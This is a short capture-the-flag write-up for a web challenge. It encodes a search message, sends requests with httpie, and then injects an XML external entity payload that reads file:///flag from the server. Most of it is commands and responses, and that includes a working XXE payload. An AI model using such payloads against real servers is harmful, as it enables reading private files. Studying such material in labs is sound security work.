
Find ``post.js`` in home page

```bash
https://bnv.web.ctfcompetition.com/static/post.js
```

Calculate message_new according to function AjaxFormPost, 'zurich', for example, was mapped to '135601360123502401401250'

Send post request with httpie

```bash
http --json --verbose -f POST  https://bnv.web.ctfcompetition.com/api/search Content-Type:"application/json" message=135601360123502401401250
```

Request

```bash
POST /api/search HTTP/1.1
Accept: application/json
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 39
Content-Type: application/json
Host: bnv.web.ctfcompetition.com
User-Agent: HTTPie/0.9.4

{
    "message": "135601360123502401401250"
}
```

Response

```bash
HTTP/1.1 200 OK
Content-Encoding: gzip
Content-Type: application/json; charset=utf-8
Date: Tue, 23 Jun 2020 03:51:29 GMT
Server: gunicorn/19.9.0
Transfer-Encoding: chunked
Vary: Accept-Encoding
Via: 1.1 google

{
    "ValueSearch": "Welcome! Our center is located in Brandschenkestrasse 110, 8002 Zurich, Opening hours for this center is 8:00-17:00"
}

```

Try to request with XML

```bash
http --verbose -f POST  https://bnv.web.ctfcompetition.com/api/search Content-Type:"application/xml" <<< '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE message [<!ELEMENT message ANY ><!ENTITY mycode SYSTEM "file:///flag" >]><message>135601360123502401401250</message>'

```

It's working. Now, post with the attack payload

```bash
http --verbose -f POST  https://bnv.web.ctfcompetition.com/api/search Content-Type:"text/xml" < payload.xml
```

Got one flag in response.
